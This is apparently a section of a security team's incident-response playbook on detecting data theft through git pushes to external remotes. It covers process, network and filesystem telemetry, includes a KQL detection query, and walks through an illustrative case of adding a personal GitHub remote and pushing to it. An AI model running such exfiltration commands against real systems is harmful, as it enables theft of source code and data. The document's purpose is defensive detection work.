# Exfiltration Channel Deep-Dive: Git Repository Cloning/Pushing to External Remotes

*Module scope: this section assumes the master playbook's channel-narrowing triage has already surfaced a developer or engineering host, source-code-adjacent data, or a `git`/SSH/HTTPS process in the transfer window. The job here is to confirm or rule out the git channel specifically — not to re-explain what a repository is or how git push/pull works.*

Relevant technique mapping: **T1567** Exfiltration Over Web Service covers the common case — pushing to a personal GitHub/GitLab/Bitbucket account or an attacker-created remote over HTTPS, riding a domain the org already trusts for legitimate dev work. **T1048** Exfiltration Over Alternative Protocol applies when the transport is the raw `git://` protocol (port 9418, unauthenticated, rarely allowed outbound) or SSH on a non-standard port used specifically to dodge a proxy that only inspects 443. **T1071** Application Layer Protocol is the umbrella if you're arguing the traffic blends into normal HTTPS/SSH baseline rather than standing out volumetrically.

This channel gets missed constantly because it looks exactly like a developer doing their job. Git traffic to github.com is business-as-usual noise on any engineering network — the difference between a legitimate `git push origin main` and an insider shipping the customer database dump as a repo is almost entirely in the *destination* and the *content*, not the protocol.

## Endpoint Process Telemetry (4688 / 4103 / 4104)

Git operations are child processes, not a single monolithic binary — that fan-out is your best endpoint signal.

| Event | What to pull | Suspicious pattern |
|---|---|---|
| **4688** New Process Created | `New Process Name` = `git.exe`, `git-remote-https.exe`, `git-upload-pack`/`git-receive-pack`, `ssh.exe`; `Command Line` (requires command-line auditing enabled); `Creator Process Name` (parent) | `git.exe` spawned from a script host (`powershell.exe`, `cmd.exe`, `wscript.exe`) rather than a terminal or IDE the user normally uses; `git push` command line referencing a remote URL that isn't the corporate GitLab/Bitbucket host; `ssh.exe` spawned as a child of `git.exe` connecting outbound on 22 |
| **4688** | `git-credential-manager.exe`, `git-credential-store` invocations | Sudden credential-helper activity for a *new* host entry (e.g., `git:https://github.com`) on a machine that has only ever authenticated to the internal git server |
| **4103** PowerShell module logging | Pipeline invoking `git` cmdlets/wrappers, `gh` (GitHub CLI), or `Invoke-WebRequest` against `codeload.github.com` / `api.github.com` | Scripted, unattended repository operations outside normal working hours |
| **4104** PowerShell script block logging | Full script text | Scripts that clone, zip, then push — or that construct a remote URL string dynamically (often paired with T1027 obfuscation if the destination is being hidden) |

**[ANALYST]** - The process tree matters more than any single event: `explorer.exe` → `Code.exe`/`cmd.exe` → `git.exe` → `git-remote-https.exe` is normal developer behavior. `git.exe` spawned directly by a scheduled task host process, or by a script interpreter with no interactive parent, is not. Pull the full command line if auditing allows it — `git remote add <name> <url>` followed by `git push <name>` in short succession is the exact fingerprint of "add a new destination, then send everything to it."

## Network Telemetry

- **DNS**: queries for `github.com`, `codeload.github.com`, `objects.githubusercontent.com`, `gitlab.com`, `bitbucket.org`, or a self-hosted git server domain the environment has never resolved before. A host that has only ever resolved the internal GitLab FQDN suddenly resolving a public git host is a strong pivot point.
- **Proxy/firewall logs**: HTTPS to a git-hosting provider showing URI paths `/info/refs?service=git-upload-pack` (fetch/clone negotiation) or `/info/refs?service=git-receive-pack` and `/git-receive-pack` (push). User-Agent string of the form `git/2.x.x` — a bare git client UA is a much cleaner signal than a browser UA on the same destination.
- **SSH sessions outbound**: TCP/22 to a public git host IP range, or — rarer but higher-signal — TCP/9418 (raw `git://` protocol, unauthenticated, almost never a legitimate outbound requirement in a managed environment).
- **Volume**: packfile transfer size is your exfil-volume proxy. A `git-receive-pack` POST with a large, monotonically packed payload from a repo that's normally a few KB of diff churn per commit is the equivalent of the HTTP channel's "POST volume spike."

## Git Client and Filesystem Artifacts

- `.git/config` — a newly added `[remote "exfil"]` or similarly named remote block, or the `origin` URL itself rewritten to point outside the corporate git host.
- Git reflog / command history — `git remote add`, `git push -u <new-remote> <branch>` sequences.
- New local clone directories created just before the push, or a working tree that was previously read-only/reference-only suddenly gaining commit history it shouldn't have (staged data smuggled in as a "commit").
- Credential storage: Windows Credential Manager entries or `~/.git-credentials` gaining a token/PAT for a personal account host.
- SSH `known_hosts` gaining a new entry for `github.com`/`gitlab.com` on a host that's never talked to it before.

## Server-Side / Provider Audit Logs

If the org runs self-hosted GitLab, Bitbucket Server, or GitHub Enterprise, the platform's own audit log is authoritative and should be pulled regardless of endpoint coverage: repository clone/download events, push events with commit SHA and byte count, new personal access token creation, new SSH key added to a user account, and source IP of the actor. Correlate that source IP back to 4624 logon sessions to confirm the identity actually at the keyboard.

If the destination is the attacker's *own* personal GitHub/GitLab account, you get none of that — you're relying entirely on the endpoint and network telemetry above, plus after-the-fact OSINT on the destination account/repo if it's ever made public or seized via legal process.

## Differentiating This Channel From Others

- Process tree contains `git.exe`/`ssh.exe`/`git-remote-https.exe` — not `curl.exe`, not a browser upload, not an FTP/SMB client.
- URI path pattern `/info/refs?service=git-*` and `git-receive-pack` is unique to git's smart-HTTP protocol, distinct from generic cloud-storage PUT/POST paths.
- Destination is a *code hosting* platform, not a general file-storage or messaging platform — narrows enrichment to repo/account reputation rather than bucket/file reputation.
- Payload is packfile-encoded (binary, delta-compressed git objects), not a raw archive or document — if DLP content inspection can decrypt and unpack it, the internal structure (`.git` objects, commit metadata) confirms the channel even if the destination host is ambiguous.

**[ENGINEERING]** - Baseline git-hosting-provider egress per host, same as any web-channel baseline: flag first-seen-in-environment git remotes, and specifically flag `git-receive-pack` (push) traffic to a personal-tier account pattern (personal GitHub usernames rather than the org's GitHub Enterprise/GitLab tenant path prefix).

```kql
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FileName in~ ("git.exe","git-remote-https.exe","ssh.exe")
| where ProcessCommandLine has_any ("push","remote add")
| where ProcessCommandLine !has "gitlab.vantage-robotics.example.com"  // corporate git host allowlist
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```

Example: analyst pulls this for host `DEV-JCHEN-L01` (user `jchen`, 10.20.4.55) and finds `git remote add backup https://github.com/jchen85/private-mirror.git` followed minutes later by `git push backup main` — on a repo that normally only pushes to the internal GitLab. Proxy logs confirm a `git-receive-pack` POST with a User-Agent of `git/2.43.0` to `github.com`, packfile size an order of magnitude larger than the repo's usual commit diff. That combination — new remote, personal-account URL pattern, oversized push, no corresponding change ticket — is enough to escalate; it is not, by itself, enough to close as Confirmed Malicious without pulling the actual commit contents and confirming what left.

**[STAKEHOLDER]** - Source code and the data sometimes bundled alongside it (config files with credentials, customer fixtures, exported datasets checked in for testing) can leave the building through a channel that looks identical to normal engineering work. The control that actually reduces this risk is an egress allowlist for git remotes plus DLP visibility into git push content — not banning git, which nobody upstream will accept.

**[MANAGEMENT]** - Own an explicit allowlist of sanctioned git remotes (corporate GitLab/GitHub Enterprise org) and alert on any push to a remote outside it; review personal access token and SSH key provisioning for developer accounts on a defined cadence, since a leaked or over-scoped PAT is the credential most commonly abused for this exact path. Track push-to-unsanctioned-remote alert volume and time-to-triage as a standing metric — this is a high-signal, low-volume detection when tuned correctly, and it should stay that way.

Route confirmed git-channel activity into the master playbook's evidence-collection step (source host/user identity via 4624 Logon ID chain, destination repo enrichment, and — where available — provider-side audit log) before deciding between Confirmed Malicious, Benign Positive (an approved backup mirror or open-source contribution), or Insufficient Evidence (destination content unrecoverable, no DLP visibility into the push payload).
